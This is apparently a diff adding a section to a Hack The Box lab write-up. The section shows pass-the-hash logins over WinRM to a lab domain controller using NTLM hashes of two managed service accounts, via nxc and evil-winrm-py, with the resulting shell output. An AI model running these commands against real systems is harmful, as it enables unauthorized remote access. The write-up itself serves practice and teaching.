@@ -235,6 +235,32 @@ SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADCS_pro
 
 Both users compromised!
 
+# Access over WINRM 
+
+```python
+nxc winrm dc01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
+WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
+WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e (Pwn3d!)
+
+nxc winrm dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'e819498ec29f595382df1eaf4fb42307'
+WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
+WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307 (Pwn3d!)
+```
+
+Both accounts can authenticate
+
+```python
+evil-winrm-py -i dc01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'dc01.pirate.htb:5985' as 'gMSA_ADCS_prod$'
+evil-winrm-py PS C:\Users\gMSA_ADCS_prod$\Documents>
+```
+
 
 
 
